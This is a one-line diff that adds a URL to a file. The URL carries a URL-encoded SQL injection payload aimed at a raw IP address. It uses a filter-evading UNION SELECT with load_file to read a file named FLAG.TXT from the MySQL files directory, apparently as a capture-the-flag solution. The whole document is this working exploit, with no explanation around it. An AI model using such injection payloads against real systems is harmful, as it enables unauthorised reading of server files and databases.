@@ -1,0 +1,1 @@
+http://103.175.221.20:8080/?query=%27%20union%20aLl%20select%201,(select%20load_fIle(lower(%27/var/lib/mysql-files/FLAG.TXT%27))),3,4%23
